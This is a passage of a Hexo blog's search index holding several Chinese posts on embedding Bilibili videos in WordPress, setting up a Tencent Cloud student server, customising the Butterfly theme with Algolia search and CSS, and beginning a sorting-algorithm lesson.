alt="bilibili"></p><p>单击“复制”按钮以复制代码。</p><p>然后，将该代码粘贴到WordPress网站上的任何文章或者页面。我</p><p>下面我们将演示将代码复制粘贴到页面的块编辑器（古腾堡编辑器）。</p><p>通过WordPress仪表板中的<strong>页面»新建页面</strong>，即可创建新页面。然后，将HTML块添加到这个页面。</p><p>然后，需要将B站的视频分享iFrame代码粘贴到该块中。</p><p><img src="/images/python/image-20210805213332748.png" alt="编辑视频"></p><h3 id="方法2-小石的方法"><a href="#方法2-小石的方法" class="headerlink" title="方法2-小石的方法"></a>方法2-小石的方法</h3><p>虽然b站给的iFrame已经很棒了，但是在我的博客里视频的大小自适应的非常丑。于是我开始在网络上搜索解决方案，终于在小石的博客上看到了优雅的方法。</p><p>在html中写入如下代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;spkj&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://player.bilibili.com/player.html?aid=视频AV号&amp;page=1&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100%&quot;</span> <span class="hljs-attr">frameborder</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">scrolling</span>=<span class="hljs-string">&quot;no&quot;</span> <span class="hljs-attr">allowfullscreen</span>=<span class="hljs-string">&quot;allowfullscreen&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">data-mce-type</span>=<span class="hljs-string">&quot;bookmark&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: inline-block; width: 0px; overflow: hidden; line-height: 0;&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;mce_SELRES_start&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span>  <br><span class="javascript"><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;spkj&quot;</span>).style.height=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;spkj&quot;</span>).scrollWidth*<span class="hljs-number">0.76</span>+<span class="hljs-string">&quot;px&quot;</span>;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>获取aid的方法：</p><p><img src="/images/python/image-20210805224132340.png" alt="红框内"></p><p>红框内含视频的aid。</p><h3 id="方法3-胡小宁的偷懒小妙招"><a href="#方法3-胡小宁的偷懒小妙招" class="headerlink" title="方法3-胡小宁的偷懒小妙招"></a>方法3-胡小宁的偷懒小妙招</h3><p>上述方法都带有一点雄心，就是把视频放在自己的网站上播放。我认为，还有一种更好的方法，就是通过card超链接的方式，直接跳到原视频处观看= = 。</p><p>效果：</p><p><img src="/images/python/image-20210805233138014.png" alt="功力不够，只能先这样了"></p><h2 id="建立每日英文页面"><a href="#建立每日英文页面" class="headerlink" title="建立每日英文页面"></a>建立每日英文页面</h2><p>胡小宁在21年9月份将进入大三学期，时光如梭，岁月无声，心中百感交集。对于如今的每一个大学生而言，到我这个阶段，就要开始思考未来的方向，是读研还是工作。胡小宁高考成绩是566分，没能考入传统的211/985读书，是至今的遗憾。所以，对于胡小宁来说，选择读研圆梦是不言而喻的。方才蹲坑的时候背单词，看到软件上有英文周刊，就点了进去，没想到要收费，这就让胡小宁很不爽。于是，我萌生了一个想法，那就是在数据社区建立一个学习英语的平台。我们自己办一个“英文日刊”！</p><p><img src="/images/python/image-20210806194446694.png" alt="效果"></p><h3 id="建立每日阅读"><a href="#建立每日阅读" class="headerlink" title="建立每日阅读"></a>建立每日阅读</h3><p>第一个写好的部分是每日英文的页面与每日阅读的页面。胡小宁认为，英语得阅读者得天下。所以先做的工作，就是建立好每日阅读的页面。</p><p><img src="/images/python/image-20210806194628849.png" alt="缩略图"></p><p>每日阅读用到的插件是：<mark class="hl-label orange">Stackable</mark> 。</p><p>效果：</p><p><img src="/images/python/image-20210806213315378.png" alt="每日单词"></p><p><img src="/images/python/image-20210806213353428.png" alt="嵌入了抖音视频"></p><h2 id="搭建英文周刊"><a href="#搭建英文周刊" class="headerlink" title="搭建英文周刊"></a>搭建英文周刊</h2><p>准备搭建一个英文周刊的页面，会有nature、the economist、the new yorker等周刊云集。但是搭建过程中遇到了一点障碍，就是pdf文件超过最大上传文件限制。所以要修改一下限制。</p><p>我要用到服务器提供的<mark class="hl-label orange">宝塔linux面板</mark> 。</p><p><img src="/images/python/image-20210808181749873.png" alt="修改php.ini"></p><p>修改文件最大上传文件限制。</p><mark class="hl-label red">重启服务器</mark> ！<p><img src="/images/python/image-20210808182124439.png" alt="效果"></p><p><img src="/images/python/image-20210808182333018.png" alt="效果"></p><h3 id="一定要看完这里再继续阅读"><a href="#一定要看完这里再继续阅读" class="headerlink" title="一定要看完这里再继续阅读"></a>一定要看完这里再继续阅读</h3><p>下面的宝塔linux方法，适用于你的网站一开始绑定的就是宝塔linux里面软件管理的php。我的php独立于宝塔，所以需要直接修改php.ini。</p><h3 id="在宝塔linux软件管理安装php"><a href="#在宝塔linux软件管理安装php" class="headerlink" title="在宝塔linux软件管理安装php"></a>在宝塔linux软件管理安装php</h3><p><img src="/images/python/image-20210808175918061.png" alt="安装php"></p><p><img src="/images/python/image-20210808180102619.png" alt="打开软件，修改"></p><h3 id="修改nginx"><a href="#修改nginx" class="headerlink" title="修改nginx"></a>修改nginx</h3><p><img src="/images/python/image-20210808181235373.png" alt="修改"></p><h3 id="搭建英文周刊页面"><a href="#搭建英文周刊页面" class="headerlink" title="搭建英文周刊页面"></a>搭建英文周刊页面</h3><p>文件最大post限制问题已经解决。</p><p>接下来就是写页面的工作emmm…</p><h3 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h3><p>经过了<mark class="hl-label blue">30min</mark> 的忙碌，大功告成！！！</p><p><img src="/images/python/image-20210808185543144.png" alt="效果图"></p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 前端 </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云之购买与配置</title>
      <link href="/2021/08/04/%E8%85%BE%E8%AE%AF%E4%BA%91%E4%B9%8B%E8%B4%AD%E4%B9%B0%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/08/04/%E8%85%BE%E8%AE%AF%E4%BA%91%E4%B9%8B%E8%B4%AD%E4%B9%B0%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h1><p>2021.8.3晚，为了支撑起日后<mark class="hl-label blue">云服务器</mark> 的费用，我放弃了自动续费两年的网易云会员，这是个悲伤的夜晚！</p><h2 id="服务器的购买"><a href="#服务器的购买" class="headerlink" title="服务器的购买"></a>服务器的购买</h2><p>我是个穷学生，连支付网易云会员都要考虑一下，按理来说应该租不起云服务器的。好在阿里云和腾讯云都给学生提供了极大的福利，可以超低的价格租一台云服务器。</p><p><a href="https://cloud.tencent.com/act/campus?utm_source=qcloud&utm_medium=navigation&utm_campaign=campus">点我</a>进入学生优惠购买云服务器。</p><p><img src="/images/python/%E8%B4%AD%E4%B9%B0%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8.png" alt="购买云服务器"></p><p>一年108元！真的<mark class="hl-label orange">便宜</mark> 有没有！</p><p>我选择的是<mark class="hl-label blue">轻量应用服务器</mark> ，因为可以选择镜像一键搭建好环境，如果你想手动搭建，那就选择购买<mark class="hl-label blue">云服务器</mark> 。选择它最直接的原因是可以极速搭建<mark class="hl-label purple">wordpress</mark> 。</p><p>操作系统我选择的是<mark class="hl-label red">centos</mark> 。</p><h2 id="服务器的搭建"><a href="#服务器的搭建" class="headerlink" title="服务器的搭建"></a>服务器的搭建</h2><p>购买好后，进入控制台，点进实例，查看详情。</p><p><img src="/images/python/%E6%90%AD%E5%BB%BA%E6%9C%8D%E5%8A%A1%E5%99%A8.png" alt="进入到控制台"></p><p><img src="/images/python/%E8%BF%9B%E5%85%A5%E5%88%B0%E5%AE%9E%E4%BE%8B.png" alt="进入到实例"></p><p>点击重置应用，便可选择要搭建的镜像。</p><p><img src="/images/python/%E9%87%8D%E7%BD%AE%E5%BA%94%E7%94%A8.png" alt="重置应用"></p><p>我选择的是<mark class="hl-label red">wordpress5.7.1社区版</mark> 。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> wordpress </tag>
            
            <tag> 腾讯云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>配置butterfly时我踩过的坑</title>
      <link href="/2021/08/03/%E9%85%8D%E7%BD%AEbutterfly%E6%97%B6%E6%88%91%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/"/>
      <url>/2021/08/03/%E9%85%8D%E7%BD%AEbutterfly%E6%97%B6%E6%88%91%E8%B8%A9%E8%BF%87%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="最前面的话"><a href="#最前面的话" class="headerlink" title="最前面的话"></a>最前面的话</h1><p>因为之前用过很多的主题，并且安装的方式都是从<mark class="hl-label blue">github</mark> 上<mark class="hl-label default">clone</mark> 下来。而安装<mark class="hl-label purple">butterfly</mark> 的方式是通过<mark class="hl-label orange">npm</mark> 下来的。这就导致主题文件并不在theme里。先前的主题文件都是保存在theme里的，并且都会在博客根目录或者主题文件里生成一个<mark class="hl-label green">_config.xxxx.yml</mark> 的.yml文件，所以配置主题就直接修改生成的yml文件就好了。但是捏，我这次<mark class="hl-label orange">npm</mark> 挖了很大的一个坑，我找不到生成的<mark class="hl-label green">_config.butterfly.yml</mark> 了！</p><p>在我看<a href="https://blog.imzjw.cn/posts/b74f504f/">小嘉的部落格</a>配置主页文字的时候，有一处需要修改<code>css</code>文件，但我并不知道css文件在哪里。机缘巧合之下，我开始了Google之旅，并发现了先前自己给自己挖的坑。原来<mark class="hl-label orange">npm</mark> 下来的主题文件在<code>\node_modules\hexo-theme-butterfly</code>，<mark class="hl-label green">_config.butterfly.yml</mark> 也在里面。</p><p>我也很佩服自己在没有官方配置文件的前提下，还能装修一阵博客 hhhh。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 前端 </tag>
            
            <tag> butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly装修之新手上路</title>
      <link href="/2021/08/02/Butterfly%E8%A3%85%E4%BF%AE%E4%B9%8B%E6%96%B0%E6%89%8B%E4%B8%8A%E8%B7%AF/"/>
      <url>/2021/08/02/Butterfly%E8%A3%85%E4%BF%AE%E4%B9%8B%E6%96%B0%E6%89%8B%E4%B8%8A%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="最前面的话"><a href="#最前面的话" class="headerlink" title="最前面的话"></a>最前面的话</h1><p>小站使用的<mark class="hl-label purple">butterfly</mark> 版本是<mark class="hl-label red">v3.8.3</mark> </p><p>小站是通过npm安装的<mark class="hl-label purple">butterfly</mark> 主题，所以主题文件并不在theme里面。而是在<code>\node_modules\hexo-theme-butterfly</code>.话说寻找这个主题文件在哪花了我不少功夫 - - 。</p><p>文章中的内容参考见：</p><table><thead><tr><th><a href="https://blog.imzjw.cn/">小嘉的部落格</a></th><th>首页字体、全局背景透明渐变、页脚透明渐变</th></tr></thead><tbody><tr><td></td><td></td></tr><tr><td></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>装修博客这件事说简单也简单，说繁琐也很繁琐。起初我只是把它当作一个记录学习历程的工具，后来看到许多博主的博客精美巧妙，真的是相形见绌。于是，我也开始了漫长的“打扮”之路。一开始我所用的主题是hexo默认主题，后来改用yilia，next，icarus。直到最近我发现很多朋友都使用<mark class="hl-label purple">butterfly</mark> ，一看这主题还不赖，就套用了一下。又因为butterfly的文档是目前我所接触到的写的最详实的，配置主题省了不少事，所以就打算一直用下去了。</p><h2 id="给文字加label"><a href="#给文字加label" class="headerlink" title="给文字加label"></a>给文字加label</h2><blockquote><p>3.7.5 及以上版本適用</p></blockquote><p>高亮所需的文字</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#123;% label text color %&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">text</td><td align="center">文字</td></tr><tr><td align="center">color</td><td align="center">【可选】背景颜色，默认为 default<br/>default/blue/pink/red/purple/orange/green</td></tr></tbody></table><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">臣亮言：&#123;% label 先帝 %&#125;創業未半，而&#123;% label 中道崩殂 blue %&#125;。今天下三分，&#123;% label 益州疲敝 pink %&#125;，此誠&#123;% label 危急存亡之秋 red %&#125;也！然侍衞之臣，不懈於內；&#123;% label 忠志之士 purple %&#125;，忘身於外者，蓋追先帝之殊遇，欲報之於陛下也。誠宜開張聖聽，以光先帝遺德，恢弘志士之氣；不宜妄自菲薄，引喻失義，以塞忠諫之路也。<br>宮中、府中，俱為一體；陟罰臧否，不宜異同。若有&#123;% label 作奸 orange %&#125;、&#123;% label 犯科 green %&#125;，及為忠善者，宜付有司，論其刑賞，以昭陛下平明之治；不宜偏私，使內外異法也。<br></code></pre></td></tr></table></figure><p>臣亮言：<mark class="hl-label default">先帝</mark> 創業未半，而<mark class="hl-label blue">中道崩殂</mark> 。今天下三分，<mark class="hl-label pink">益州疲敝</mark> ，此誠<mark class="hl-label red">危急存亡之秋</mark> 也！然侍衞之臣，不懈於內；<mark class="hl-label purple">忠志之士</mark> ，忘身於外者，蓋追先帝之殊遇，欲報之於陛下也。誠宜開張聖聽，以光先帝遺德，恢弘志士之氣；不宜妄自菲薄，引喻失義，以塞忠諫之路也。<br>宮中、府中，俱為一體；陟罰臧否，不宜異同。若有<mark class="hl-label orange">作奸</mark> 、<mark class="hl-label green">犯科</mark> ，及為忠善者，宜付有司，論其刑賞，以昭陛下平明之治；不宜偏私，使內外異法也。</p><h2 id="配置搜索功能"><a href="#配置搜索功能" class="headerlink" title="配置搜索功能"></a>配置搜索功能</h2><h3 id="注册Algolia账号"><a href="#注册Algolia账号" class="headerlink" title="注册Algolia账号"></a>注册Algolia账号</h3><p><a href="https://www.algolia.com/">点我</a>，进入网站使用<mark class="hl-label orange">Google</mark> 或者<mark class="hl-label blue">GitHub</mark> 注册账号。</p><h4 id="创建index"><a href="#创建index" class="headerlink" title="创建index"></a>创建index</h4><p><img src="/images/python/index%E7%AC%AC%E4%B8%80%E6%AD%A5.png" alt="点击红框的按钮，进入创建index"></p><p><img src="/images/python/index%E7%AC%AC%E4%BA%8C%E6%AD%A5.png" alt="按步骤执行"></p><h4 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h4><p><img src="/images/python/index%E7%AC%AC%E4%B8%89%E6%AD%A5.png" alt="记下框中三个东东"></p><h3 id="npm组件"><a href="#npm组件" class="headerlink" title="npm组件"></a>npm组件</h3><p>在博客根目录安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install hexo-algoliasearch --save<br></code></pre></td></tr></table></figure><p>在<mark class="hl-label green">_config.yml</mark> 配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">algolia:</span><br>  <span class="hljs-attr">appId:</span> <span class="hljs-string">&quot;你的appid&quot;</span><br>  <span class="hljs-attr">apiKey:</span> <span class="hljs-string">&quot;你的apikey&quot;</span><br>  <span class="hljs-attr">adminApiKey:</span> <span class="hljs-string">&quot;你的adminapikey&quot;</span><br>  <span class="hljs-attr">chunkSize:</span> <span class="hljs-number">5000</span><br>  <span class="hljs-attr">indexName:</span> <span class="hljs-string">&quot;你刚才创建的index名&quot;</span><br>  <span class="hljs-attr">fields:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">content:strip:truncate,0,500</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">excerpt:strip</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">gallery</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">permalink</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">photos</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">slug</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">tags</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">title</span><br></code></pre></td></tr></table></figure><p>对照填写刚才框中的东东</p><p>在<mark class="hl-label green">_config.butterfly.yml</mark> 配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">algolia_search:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">hits:</span><br>    <span class="hljs-attr">per_page:</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><h3 id="大功告成"><a href="#大功告成" class="headerlink" title="大功告成"></a>大功告成</h3><ol><li>hexo clean</li><li>hexo g</li><li>hexo algolia</li></ol><h2 id="配置首页字体"><a href="#配置首页字体" class="headerlink" title="配置首页字体"></a>配置首页字体</h2><p>需要你自己新建一个 <code>css</code> 文件，在主题文件里的 <code>source \ css</code> 文件夹里新建一个 <code>css</code> 文件，命名随意。</p><p>往里写几行代码就完事了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@font-face</span> &#123;<br>    <span class="hljs-attribute">font-family</span>:<span class="hljs-string">&#x27;arzhu&#x27;</span>;<br>    <span class="hljs-attribute">src</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;https://cdn.jsdelivr.net/gh/xxx/xxx/font/xxx.ttf&#x27;</span>); <span class="hljs-comment">/* 修改成你的字体 */</span><br>    <span class="hljs-attribute">font-display</span>:swap<br>&#125;<br><span class="hljs-selector-tag">h1</span><span class="hljs-selector-id">#site-title</span> &#123;<br>    <span class="hljs-attribute">font-family</span>:arzhu<span class="hljs-meta">!important</span><br>&#125;<br><span class="hljs-selector-tag">span</span><span class="hljs-selector-id">#subtitle</span> &#123;<br>    <span class="hljs-attribute">font-family</span>:arzhu<span class="hljs-meta">!important</span><br>&#125;<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-id">#site-name</span> &#123;<br>    <span class="hljs-attribute">font-family</span>:arzhu<span class="hljs-meta">!important</span><br>&#125;<br></code></pre></td></tr></table></figure><p>挑选您心爱的字体，并把它下载下来，可以存在本地，也可以利用 <code>jsdelivr</code> 的方式加速，最后替换 css 文件中的 url 即可，<code>arzhu</code> 只是别名，可以任意修改，不过引用的时候，要确保名字相同</p><p>最后在主题的配置文件里找到 <code>inject</code> 配置项，引用刚刚新建的 css 文件即可</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-string">&lt;link</span> <span class="hljs-string">rel=&quot;stylesheet&quot;</span> <span class="hljs-string">href=&quot;/css/custom.css&quot;</span> <span class="hljs-string">media=&quot;defer&quot;</span> <span class="hljs-string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span><br></code></pre></td></tr></table></figure><h2 id="配置全局背景透明渐变"><a href="#配置全局背景透明渐变" class="headerlink" title="配置全局背景透明渐变"></a>配置全局背景透明渐变</h2><p>同理，在刚刚新建的 css 文件里，添加如下代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#recent-posts</span>&gt;<span class="hljs-selector-class">.recent-post-item</span>,<span class="hljs-selector-class">.layout_page</span>&gt;<span class="hljs-selector-tag">div</span><span class="hljs-selector-pseudo">:first-child</span><span class="hljs-selector-pseudo">:not(.recent-posts)</span>,<span class="hljs-selector-class">.layout_post</span>&gt;<span class="hljs-selector-id">#page</span>,<span class="hljs-selector-class">.layout_post</span>&gt;<span class="hljs-selector-id">#post</span>,<span class="hljs-selector-class">.read-mode</span> <span class="hljs-selector-class">.layout_post</span>&gt;<span class="hljs-selector-id">#post</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--light_bg_color)<br>&#125;<br><br><span class="hljs-selector-id">#aside-content</span> <span class="hljs-selector-class">.card-widget</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">var</span>(--light_bg_color)<br>&#125;<br><br><span class="hljs-selector-id">#web_bg</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>,rgba(<span class="hljs-number">247</span>,<span class="hljs-number">149</span>,<span class="hljs-number">51</span>,.<span class="hljs-number">1</span>),<span class="hljs-built_in">rgba</span>(<span class="hljs-number">243</span>,<span class="hljs-number">112</span>,<span class="hljs-number">85</span>,.<span class="hljs-number">1</span>) <span class="hljs-number">15%</span>,<span class="hljs-built_in">rgba</span>(<span class="hljs-number">239</span>,<span class="hljs-number">78</span>,<span class="hljs-number">123</span>,.<span class="hljs-number">1</span>) <span class="hljs-number">30%</span>,<span class="hljs-built_in">rgba</span>(<span class="hljs-number">161</span>,<span class="hljs-number">102</span>,<span class="hljs-number">171</span>,.<span class="hljs-number">1</span>) <span class="hljs-number">44%</span>,<span class="hljs-built_in">rgba</span>(<span class="hljs-number">80</span>,<span class="hljs-number">115</span>,<span class="hljs-number">184</span>,.<span class="hljs-number">1</span>) <span class="hljs-number">58%</span>,<span class="hljs-built_in">rgba</span>(<span class="hljs-number">16</span>,<span class="hljs-number">152</span>,<span class="hljs-number">173</span>,.<span class="hljs-number">1</span>) <span class="hljs-number">72%</span>,<span class="hljs-built_in">rgba</span>(<span class="hljs-number">7</span>,<span class="hljs-number">179</span>,<span class="hljs-number">155</span>,.<span class="hljs-number">1</span>) <span class="hljs-number">86%</span>,<span class="hljs-built_in">rgba</span>(<span class="hljs-number">109</span>,<span class="hljs-number">186</span>,<span class="hljs-number">130</span>,.<span class="hljs-number">1</span>))<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="页脚透明渐变"><a href="#页脚透明渐变" class="headerlink" title="页脚透明渐变"></a>页脚透明渐变</h2><p>完成了如上全局背景透明渐变，那么你的部落格背景就应该会有所变化了，但是发现这个页脚和我们的背景完全不搭</p><p>一样在刚刚新建的 <code>css</code> 文件里，添加如下代码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#footer</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,.<span class="hljs-number">15</span>);<br>    <span class="hljs-attribute">color</span>: <span class="hljs-number">#000</span>;<br>    <span class="hljs-attribute">border-top-right-radius</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">border-top-left-radius</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">backdrop-filter</span>: <span class="hljs-built_in">saturate</span>(<span class="hljs-number">100%</span>) <span class="hljs-built_in">blur</span>(<span class="hljs-number">5px</span>)<br>&#125;<br><br><span class="hljs-selector-id">#footer</span><span class="hljs-selector-pseudo">::before</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,.<span class="hljs-number">15</span>)<br>&#125;<br><br><span class="hljs-selector-id">#footer</span> <span class="hljs-selector-id">#footer-wrap</span> &#123;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--font-color)<br>&#125;<br><br><span class="hljs-selector-id">#footer</span> <span class="hljs-selector-id">#footer-wrap</span> <span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--font-color)<br>&#125;<br></code></pre></td></tr></table></figure><p>此时，页脚部分就和我们的背景很般配了</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> 前端 </tag>
            
            <tag> butterfly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构之排序算法(一)</title>
      <link href="/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95-%E4%B8%80/"/>
      <url>/2021/08/01/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B9%8B%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95-%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<hr><p><strong>直接插入法是最简单的排序法，其排序思想如下：<br>打牌时，每抓一张牌就将其放到对应的顺序位置。</strong><br>下面是待排记录的类型定义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXSIZE 200</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">int</span> KeyType<span class="hljs-comment">//关键字类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>KeyType key;<span class="hljs-comment">//关键字</span><br>InfoType otherinfo;<span class="hljs-comment">//其他数据项</span><br>&#125;RedType;<span class="hljs-comment">//记录类型</span><br>typededf <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>RedType r[MAXSIZE+<span class="hljs-number">1</span>];<span class="hljs-comment">//r[0]闲置或作为哨兵</span><br><span class="hljs-keyword">int</span> length;<span class="hljs-comment">//顺序表长度</span><br>&#125;SqList;<br></code></pre></td></tr></table></figure><p>上述的RedType结构体类型实际上是没必要定义的，实际做题时可以写成如下代码，更方便一点：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXSIZE 200</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">int</span> KeyType<span class="hljs-comment">//关键字类型</span><br>typededf <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>KeyType r[MAXSIZE+<span class="hljs-number">1</span>];<span class="hljs-comment">//r[0]闲置或作为哨兵</span><br><span class="hljs-keyword">int</span> length;<span class="hljs-comment">//顺序表长度</span><br>&#125;SqList;<br></code></pre></td></tr></table></figure><p>直接插入排序算法的描述：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code 